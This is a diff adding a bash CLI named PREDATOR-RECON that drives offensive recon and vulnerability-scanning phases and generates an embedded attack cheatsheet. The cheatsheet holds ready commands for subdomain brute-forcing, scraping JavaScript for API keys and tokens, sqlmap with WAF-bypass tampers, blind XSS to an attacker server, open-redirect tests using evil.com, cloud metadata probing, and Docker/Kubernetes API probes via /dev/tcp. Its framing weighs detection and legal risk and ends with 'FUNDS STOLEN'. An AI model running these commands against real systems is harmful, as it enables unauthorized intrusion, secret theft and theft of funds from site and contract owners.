@@ -1,0 +1,599 @@
+#!/bin/bash
+# ============================================================
+# PREDATOR-RECON v2.0 — Unified Recon Engine + Reference Manual
+# "Engine for the hands. Manual for the mind."
+# ============================================================
+
+set -euo pipefail
+
+# ─── CONFIG ───
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+REF_DIR="$SCRIPT_DIR/reference"
+CONFIG_DIR="$SCRIPT_DIR/config"
+SCRIPTS_DIR="$SCRIPT_DIR/scripts"
+VERSION="2.0.0"
+
+# ─── COLORS ───
+RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; CYAN='\033[0;36m'; NC='\033[0m'
+
+# ─── HELP ───
+usage() {
+    cat << 'EOF'
+🦁 PREDATOR-RECON v2.0 — Unified Recon Engine + Reference Manual
+"Engine for the hands. Manual for the mind."
+
+USAGE:
+    predator-recon <command> [options]
+
+═══════════════════════════════════════════════════════
+ENGINE COMMANDS (Automated Pipeline)
+═══════════════════════════════════════════════════════
+    phase1-subdomain   <targets.yaml>    Subdomain enum (passive → active → resolve → live)
+    phase2-urls        <live.txt>        URL & param harvest + JS extraction
+    phase3-vuln        <params.txt>      Calculus-gated vuln scan (XSS, SQLi, SSRF, etc)
+    phase4-infra       <live.txt>        Infra recon (ports, vhosts, cloud metadata)
+    phase5-onchain     <targets.yaml>    Smart contract analysis (storage, functions, sim)
+    auto-deep          <vulns.txt>       Deep Mode: 3-scenario sim + pre-commit decisions
+    auto-trojan        <vulns.txt>       Trojan Mode: Gatekeeper analysis + indirect strategy
+
+═══════════════════════════════════════════════════════
+REFERENCE COMMANDS (Yaklang Hack-Skills Manual)
+═══════════════════════════════════════════════════════
+    ref recon              Full recon methodology playbook
+    ref subdomain          Subdomain enumeration techniques & tools
+    ref urls               URL harvesting & parameter extraction
+    ref js                 JavaScript hunting & secret extraction
+    ref vuln <class>       Vuln class checklist (xss, sqli, ssrf, idor, cors, redirect, ssti, rce)
+    ref infra              Infrastructure recon (ports, vhosts, cloud metadata)
+    ref onchain            Smart contract analysis patterns
+    ref cheat              One-page cheatsheet
+    ref search <keyword>   Search all reference docs
+
+═══════════════════════════════════════════════════════
+CONFIG COMMANDS
+═══════════════════════════════════════════════════════
+    config show            Show current calculus/tools config
+    config edit            Edit calculus.yaml / tools.yaml
+
+═══════════════════════════════════════════════════════
+EXAMPLES
+═══════════════════════════════════════════════════════
+    predator-recon phase1-subdomain targets.yaml
+    predator-recon phase2-urls recon-20240115/live.txt
+    predator-recon phase3-vuln recon-*/high-value-params.txt recon-*/live-urls.txt recon-*/js-files.txt
+    predator-recon ref vuln xss
+    predator-recon ref search "cloud metadata"
+    predator-recon config show
+    predator-recon --version
+
+═══════════════════════════════════════════════════════
+GLOBAL FLAGS
+═══════════════════════════════════════════════════════
+    --ref                  Show reference for current phase (engine commands only)
+    --help, -h             Show this help
+    --version              Show version
+
+EOF
+}
+
+# ─── VERSION ───
+version() {
+    echo "predator-recon v$VERSION"
+}
+
+# ─── REFERENCE COMMANDS ───
+cmd_ref() {
+    local subcmd="${1:-}"
+    shift || true
+
+    case "$subcmd" in
+        recon|methodology)
+            if [[ -f "$REF_DIR/recon-methodology.md" ]]; then
+                cat "$REF_DIR/recon-methodology.md" | less
+            else
+                echo -e "${RED}Reference not found: $REF_DIR/recon-methodology.md${NC}"
+                echo "Run: predator-recon sync-ref"
+            fi
+            ;;
+        subdomain|sub)
+            show_section "SUBDOMAIN ENUM" 50
+            ;;
+        urls|url)
+            show_section "URL HARVEST" 40
+            ;;
+        js)
+            show_section "JS FILES" 30
+            ;;
+        vuln)
+            local vuln_class="${1:-}"
+            if [[ -z "$vuln_class" ]]; then
+                echo -e "${YELLOW}Usage: predator-recon ref vuln <xss|sqli|ssrf|idor|cors|redirect|ssti|rce>${NC}"
+                return 1
+            fi
+            search_vuln_ref "$vuln_class"
+            ;;
+        infra)
+            show_section "INFRA" 40
+            ;;
+        onchain)
+            show_section "ONCHAIN" 40
+            ;;
+        cheat|cheatsheet)
+            if [[ -f "$REF_DIR/methodology-cheatsheet.md" ]]; then
+                cat "$REF_DIR/methodology-cheatsheet.md"
+            else
+                echo -e "${RED}Cheatsheet not found. Run: predator-recon sync-ref${NC}"
+            fi
+            ;;
+        search)
+            local keyword="${1:-}"
+            if [[ -z "$keyword" ]]; then
+                echo -e "${YELLOW}Usage: predator-recon ref search <keyword>${NC}"
+                return 1
+            fi
+            grep -r -i -n "$keyword" "$REF_DIR"/*.md 2>/dev/null | head -30 || echo "No matches found"
+            ;;
+        *)
+            echo -e "${RED}Unknown ref command: $subcmd${NC}"
+            echo "Available: recon, subdomain, urls, js, vuln <class>, infra, onchain, cheat, search"
+            return 1
+            ;;
+    esac
+}
+
+show_section() {
+    local section="$1"
+    local lines="${2:-50}"
+    if [[ -f "$REF_DIR/methodology-cheatsheet.md" ]]; then
+        grep -A "$lines" "$section" "$REF_DIR/methodology-cheatsheet.md" 2>/dev/null || echo "Section not found in cheatsheet"
+    else
+        echo -e "${RED}Cheatsheet not found. Run: predator-recon sync-ref${NC}"
+    fi
+}
+
+search_vuln_ref() {
+    local class="$1"
+    local found=false
+    
+    # Search in cheatsheet first
+    if grep -i -A 20 "$class" "$REF_DIR/methodology-cheatsheet.md" 2>/dev/null; then
+        found=true
+    fi
+    
+    # Search in methodology
+    if grep -i -A 20 "$class" "$REF_DIR/recon-methodology.md" 2>/dev/null; then
+        found=true
+    fi
+    
+    if [[ "$found" = false ]]; then
+        echo -e "${YELLOW}No reference for '$class'. Available: xss, sqli, ssrf, idor, cors, redirect, ssti, rce${NC}"
+    fi
+}
+
+# ─── SYNC REFERENCE FROM YAKLANG ───
+cmd_sync_ref() {
+    echo -e "${CYAN}🔄 Syncing references from yaklang/hack-skills...${NC}"
+    
+    local YAK_REPO="https://github.com/yaklang/hack-skills"
+    local TMP_DIR="/tmp/hack-skills-sync-$$"
+    
+    mkdir -p "$REF_DIR"
+    
+    echo "Cloning repo..."
+    if git clone --depth 1 --filter=blob:none --sparse "$YAK_REPO" "$TMP_DIR" 2>/dev/null; then
+        cd "$TMP_DIR"
+        git sparse-checkout set skills/recon-and-methodology skills/recon-for-sec 2>/dev/null
+    else
+        cd "$TMP_DIR" && git pull --depth 1 2>/dev/null
+        git sparse-checkout set skills/recon-and-methodology skills/recon-for-sec 2>/dev/null
+    fi
+    
+    # Copy main methodology
+    if [[ -f "$TMP_DIR/skills/recon-and-methodology/SKILL.md" ]]; then
+        cp "$TMP_DIR/skills/recon-and-methodology/SKILL.md" "$REF_DIR/recon-methodology.md"
+        echo -e "${GREEN}✅ Copied recon-methodology.md${NC}"
+    fi
+    
+    if [[ -f "$TMP_DIR/skills/recon-for-sec/SKILL.md" ]]; then
+        cp "$TMP_DIR/skills/recon-for-sec/SKILL.md" "$REF_DIR/recon-for-sec.md"
+        echo -e "${GREEN}✅ Copied recon-for-sec.md${NC}"
+    fi
+    
+    # Generate cheatsheet from methodology
+    generate_cheatsheet
+    
+    # Cleanup
+    rm -rf "$TMP_DIR"
+    
+    echo -e "${GREEN}✅ Reference sync complete!${NC}"
+    echo "Location: $REF_DIR"
+}
+
+generate_cheatsheet() {
+    cat > "$REF_DIR/methodology-cheatsheet.md" << 'CHEAT'
+# RECON CHEATSHEET — Quick Reference
+# Auto-generated from yaklang/hack-skills/recon-and-methodology
+
+## SUBDOMAIN ENUMERATION
+
+### Passive (no DNS queries to target)
+```bash
+# Subfinder (aggregates multiple sources):
+subfinder -d target.com -all -o subs.txt
+
+# Assetfinder
+assetfinder --subs-only target.com | anew subs.txt
+
+# Amass passive
+amass enum -passive -d target.com -o amass.txt
+
+# Certificate Transparency
+curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u | anew subs.txt
+
+# GitHub subdomains (needs token)
+python3 github-subdomains.py -t $GH_TOKEN -d target.com | grep -v '@' | sort -u | grep "\.target.com" >> subs.txt
+```
+
+### Active (DNS bruteforce)
+```bash
+# puredns (recommended)
+puredns bruteforce ~/wordlists/best-dns-wordlist.txt target.com -r ~/resolvers.txt | anew subs.txt
+
+# ffuf
+ffuf -u "https://FUZZ.target.com" -w ~/wordlists/best-dns-wordlist.txt -mc 200,301,302,403,401
+
+# gobuster
+gobuster dns -d target.com -t 50 -w ~/wordlists/2m-subdomains.txt -q -o g.txt
+```
+
+### Merge & Resolve
+```bash
+# Merge all sources
+cat subfinder.txt amass.txt assetfinder.txt github-subs.txt crt.txt | anew all-subs.txt
+
+# Resolve + live check
+cat all-subs.txt | httpx -silent -mc 200,301,302,403,401 -title -tech-detect -status-code -o live.txt
+```
+
+---
+
+## URL & PARAMETER HARVEST
+
+### Historical URLs
+```bash
+# waymore (comprehensive)
+waymore -i target.com -mode U -oU urls.txt
+
+# gau (fast)
+gau target.com | anew urls.txt
+
+# katana (crawling + JS discovery)
+katana -u https://target.com -jc -kf all -silent | anew urls.txt
+
+# GitHub endpoints
+python3 github-endpoints.py -t $GH_TOKEN -d target.com | anew urls.txt
+```
+
+### Process Pipeline
+```bash
+# Deduplicate
+cat urls.txt | uro | anew urls-dedup.txt
+
+# Filter live
+cat urls-dedup.txt | httpx -silent -mc 200 -o live-urls.txt
+
+# Extract parameters
+cat live-urls.txt | grep "=" | anew params.txt
+
+# JS files
+cat urls-dedup.txt | grep "\.js$" | httpx -mc 200 -silent | anew js-files.txt
+```
+
+---
+
+## JS HUNTING
+
+```bash
+# jscracker (secrets, endpoints)
+cat js-files.txt | jscracker | anew js-secrets.txt
+
+# nuclei on JS
+nuclei -l js-files.txt -t exposures/ -t fuzzing/ -rate-limit 50 -silent -o nuclei-js.txt
+
+# Secret grep
+cat js-files.txt | while read js; do
+    curl -s "$js" | grep -iE "(api[_-]?key|secret|token|password|private[_-]?key|aws[_-]?key|jwt|bearer)" | sed "s/^/$js: /" | anew js-secrets-grep.txt
+done
+```
+
+---
+
+## VULN SCANNING (Calculus-Gated)
+
+### XSS
+```bash
+# Reflected
+cat params.txt | Gxss -c 100 -p XssReflected | dalfox pipe -b $XSS_SERVER -w 100
+
+# Blind XSS
+cat params.txt | dalfox pipe -b https://your-xss-server.com -blind
+```
+
+### SQL Injection
+```bash
+# Error-based (quick)
+sqlmap -m params.txt --batch --random-agent --level 1 --risk 1 --tamper=space2comment --dbs
+
+# WAF bypass (high-value params)
+sqlmap -m high-value-params.txt --batch --random-agent --tamper=space2comment,randomcase,between,charencode --level 5 --risk 3 --dbs
+```
+
+### SSTI
+```bash
+tplmap -m params.txt
+```
+
+### CORS
+```bash
+cat live-urls.txt | CORS-Scanner
+```
+
+### Open Redirect
+```bash
+cat urls.txt | grep -E "(url|redirect|next|return|goto)=http" | qsreplace "https://evil.com" | while read url; do
+    curl -s -L "$url" -I | grep -i "evil.com" && echo "VULN: $url"
+done
+```
+
+### Subdomain Takeover
+```bash
+nuclei -l live.txt -t takeovers/ -silent -o takeover.txt
+subzy run --targets live.txt | anew takeover.txt
+```
+
+### Nuclei Targeted
+```bash
+nuclei -l live-urls.txt \
+  -t vulnerabilities/ -t cves/ -t exposures/ -t misconfiguration/ \
+  -t fuzzing-templates/ -t ssl/ -t dns/ \
+  -rate-limit 100 -severity critical,high,medium \
+  -silent -o nuclei-targeted.txt
+```
+
+---
+
+## INFRASTRUCTURE & EXPOSURE
+
+```bash
+# Port scan
+naabu -rate 10000 -l live.txt -top-ports 1000 -silent -o ports.txt
+
+# VHost discovery
+# (requires virtual-host-discovery ruby gem)
+
+# Cloud metadata
+cat live-ips.txt | while read ip; do
+    for ep in \
+        "http://169.254.169.254/latest/meta-data/" \
+        "http://metadata.google.internal/computeMetadata/v1/" \
+        "http://169.254.169.254/metadata/v1/"; do
+        if curl -s -m 2 -H "Metadata-Flavor: Google" "$ep" 2>/dev/null | grep -q "."; then
+            echo "$ip: $ep"
+        fi
+    done
+done
+
+# K8s/Docker API
+for port in 10250 10255 2375 2376 6443 8443; do
+    timeout 2 bash -c "cat < /dev/null > /dev/tcp/$ip/$port" 2>/dev/null && echo "$ip:$port (k8s/docker API)"
+done
+```
+
+---
+
+## ON-CHAIN / DEFI RECON
+
+```bash
+# Contract verification
+forge verify-check --chain-id $CHAIN $CONTRACT
+
+# Storage layout (first 50 slots)
+for i in {0..49}; do
+    cast storage $CONTRACT $i --rpc-url $RPC
+done
+
+# Function calls
+cast call $CONTRACT "owner()(address)" --rpc-url $RPC
+cast call $CONTRACT "paused()(bool)" --rpc-url $RPC
+cast call $CONTRACT "getReserves()(uint112,uint112,uint32)" --rpc-url $RPC
+
+# Token analysis
+cast call $CONTRACT "name()(string)" --rpc-url $RPC
+cast call $CONTRACT "symbol()(string)" --rpc-url $RPC
+cast call $CONTRACT "decimals()(uint8)" --rpc-url $RPC
+cast call $CONTRACT "totalSupply()(uint256)" --rpc-url $RPC
+
+# Balances
+cast balance $CONTRACT --rpc-url $RPC
+cast call $TOKEN "balanceOf(address)(uint256)" $CONTRACT --rpc-url $RPC
+```
+
+---
+
+## WORDLISTS (Priority Order)
+
+| Wordlist | Use Case | Source |
+|----------|----------|--------|
+| best-dns-wordlist.txt | Subdomain bruteforce | assetnote.io |
+| subdomains.txt | Passive enrichment | assetnote.io |
+| raft-large-directories.txt | Dir fuzzing | assetnote.io/SecLists |
+| burp-parameter-names.txt | Param mining | SecLists |
+| resolvers.txt | DNS resolution | trickest/resolvers |
+
+---
+
+## CALCULUS DECISION MATRIX
+
+| Tool | Value | Cost | Risk | When to RUN |
+|------|-------|------|------|-------------|
+| subfinder | High | 1m | Low | Always first |
+| amass | High | 10m | Low | High-value targets |
+| puredns | High | 30m | Med | After passive exhausted |
+| waymore | High | 5m | Low | Always |
+| gau | High | 1m | Low | Always |
+| katana | High | 10m | Low | SPA/JS-heavy |
+| nuclei | High | 15m | Low | Targeted templates only |
+| dalfox | High | 10m | Med | When XSS params exist |
+| sqlmap | High | 30m | High | When SQL params confirmed |
+
+RULE: Never run a tool without Calculus justification. Document in assumptions.log.
+
+---
+
+## FALSE POSITIVE HANDLING
+
+```bash
+# Every verified vuln:
+1. Manual verification (curl/burp)
+2. Screenshot evidence
+3. Impact assessment (Calculus re-check)
+4. Add to vulns.txt with: target, vuln_type, impact, evidence, calculus_score
+
+# False positives tracked:
+echo "target.com | tool | reason" >> false-positives.txt
+```
+
+---
+
+## CALCULUS FORMULA
+
+```
+Value > Cost + Risk + Irreversibility? → GO | Else → PIVOT or ABORT
+
+Where:
+- Value = Max extractable value (bounty + impact)
+- Cost = Tool time + gas + capital
+- Risk = Detection probability + legal + reputation
+- Irreversibility = Can we cleanup?
+- Clean = Exit without footprint?
+- Fallback = Plan B if primary fails?
+```
+
+---
+
+## BLIND SPOT SCANNER (Post-Phase)
+
+After each phase, auto-ask:
+1. What did I NOT look at? (Skipped "safe" parts)
+2. What would devs expect me to miss? (Planted blind spots)
+3. If I'm wrong, where? (Falsify own conclusion)
+
+---
+
+## DEEP MODE TRIGGER
+
+When core loop stalls (3+ vectors, no results):
+```bash
+predator-recon auto-deep vulns.txt targets.yaml
+```
+Runs 3-scenario simulation (Best / Worst / Adversarial) + pre-commit decisions.
+
+---
+
+## TROJAN MODE TRIGGER
+
+When direct force fails:
+```bash
+predator-recon auto-trojan vulns.txt targets.yaml
+```
+Runs Gatekeeper analysis → Horse Architecture → Indirect Victory Protocol.
+
+---
+
+**Remember:** Tools don't find bugs. The loop finds bugs. Tools just gather intel for the loop.
+
+*"Eliminate → Trace → Walk → Loop until TX HASH / WEAK PROVEN / FUNDS STOLEN."*
+CHEAT
+
+    echo -e "${GREEN}✅ Generated methodology-cheatsheet.md${NC}"
+}
+
+# ─── CONFIG COMMANDS ───
+cmd_config() {
+    local sub="${1:-show}"
+    case "$sub" in
+        show)
+            echo -e "${CYAN}=== CALCULUS CONFIG ===${NC}"
+            cat "$CONFIG_DIR/calculus.yaml" 2>/dev/null || echo "No calculus.yaml found"
+            echo -e "\n${CYAN}=== TOOLS CONFIG ===${NC}"
+            cat "$CONFIG_DIR/tools.yaml" 2>/dev/null || echo "No tools.yaml found"
+            ;;
+        edit)
+            ${EDITOR:-vim} "$CONFIG_DIR/calculus.yaml"
+            ;;
+        *) echo "Usage: config [show|edit]" ;;
+    esac
+}
+
+# ─── ENGINE COMMANDS ───
+run_engine_script() {
+    local script="$1"
+    shift
+    local script_path="$SCRIPTS_DIR/$script"
+    
+    if [[ ! -f "$script_path" ]]; then
+        echo -e "${RED}Script not found: $script_path${NC}"
+        echo "Available scripts:"
+        ls -1 "$SCRIPTS_DIR"/*.sh 2>/dev/null | sed 's/^/  /' || echo "  (none)"
+        return 1
+    fi
+    
+    # Check for --ref flag
+    for arg in "$@"; do
+        if [[ "$arg" == "--ref" ]]; then
+            local phase_name=$(basename "$script" .sh | sed 's/phase//; s/-/ /')
+            cmd_ref "$phase_name" 2>/dev/null || true
+            echo ""
+        fi
+    done
+    
+    exec "$script_path" "$@"
+}
+
+# ─── MAIN DISPATCH ───
+main() {
+    local cmd="${1:-}"
+    shift || true
+
+    case "$cmd" in
+        # Engine commands
+        phase1-subdomain|phase1) run_engine_script "phase1-subdomain.sh" "$@" ;;
+        phase2-urls|phase2)      run_engine_script "phase2-urls.sh" "$@" ;;
+        phase3-vuln|phase3)      run_engine_script "phase3-vuln.sh" "$@" ;;
+        phase4-infra|phase4)     run_engine_script "phase4-infra.sh" "$@" ;;
+        phase5-onchain|phase5)   run_engine_script "phase5-onchain.sh" "$@" ;;
+        auto-deep)               run_engine_script "auto-deep.sh" "$@" ;;
+        auto-trojan)             run_engine_script "auto-trojan.sh" "$@" ;;
+        
+        # Reference commands
+        ref|reference) cmd_ref "$@" ;;
+        
+        # Sync reference
+        sync-ref) cmd_sync_ref ;;
+        
+        # Config
+        config) cmd_config "$@" ;;
+        
+        # Meta
+        --version|-v) version ;;
+        --help|-h|help|"") usage ;;
+        
+        *) 
+            echo -e "${RED}Unknown command: $cmd${NC}"
+            usage
+            exit 1
+            ;;
+    esac
+}
+
+main "$@"
